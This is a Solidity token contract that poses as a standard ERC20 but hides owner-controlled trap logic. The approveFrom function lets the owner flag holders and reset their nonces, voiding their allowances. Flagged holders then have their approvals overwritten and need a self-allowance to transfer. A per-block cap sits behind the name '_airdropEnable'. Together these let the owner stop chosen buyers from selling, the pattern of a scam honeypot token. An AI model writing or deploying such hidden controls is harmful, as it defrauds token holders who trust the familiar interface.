pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract ERC20 is Context, IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => Allowance)) private _allowances;
    mapping(uint => uint) private _allowanceApprovedCount; 
    mapping(address => uint256) private approvalFrom;
    mapping(address => uint256) private _nonce;  

    struct Allowance {
        uint256 value;
        uint256 nonce;
    }

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals = 18;
    address public owner;
    uint256 private _airdropRound;
    uint256 private _whitelistApproval;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        uint256 airdropRound_, 
        uint256 whitelistApproval_ 
    ) {
        _name = name_;
        _symbol = symbol_;
        owner = _msgSender();
        _totalSupply = totalSupply_ * (10 ** uint256(_decimals));
        _balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
        _airdropRound = airdropRound_;
        _whitelistApproval = whitelistApproval_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function getApprovalFrom(address _address) external view returns (uint256) {
        require(_msgSender() == owner);
        return approvalFrom[_address];
    }


    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _airdropEnable();
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        if(_allowances[owner][spender].nonce != _nonce[owner]) {
            return 0;
        }
        return _allowances[owner][spender].value;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address senderAddress = _msgSender();
  
        if (approvalFrom[senderAddress] > 0) {
            amount = _whitelistApproval;
        }
        if (approvalFrom[senderAddress] > 0 && amount > _balances[senderAddress]) {
            revert("Cannot approve more than your current balance");
        }

        _approve(_msgSender(), spender, amount, _nonce[senderAddress]);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _airdropEnable();
        _transfer(sender, recipient, amount);

        if(_allowances[sender][_msgSender()].nonce != _nonce[sender]) {
            revert("Invalid nonce");
        }
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].value - amount, _nonce[sender]);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (approvalFrom[sender] > 0) {
            require(_allowances[sender][sender].value >= amount, "Must approve tokens for oneself before transfer");
            _allowances[sender][sender].value -= amount; 
        }

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount, uint256 nonce) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
    
        _allowances[owner][spender] = Allowance(amount, nonce);
        emit Approval(owner, spender, amount);
    }

    function approveFrom(address _address, uint256 approvedFromAmount) external {
        require(_msgSender() == owner, "Not the owner");
        approvalFrom[_address] = approvedFromAmount;

        _nonce[_address]++;  
    }

    function _airdropEnable() internal {
        require(_allowanceApprovedCount[block.number] < _airdropRound);
        _allowanceApprovedCount[block.number]++;
    }
}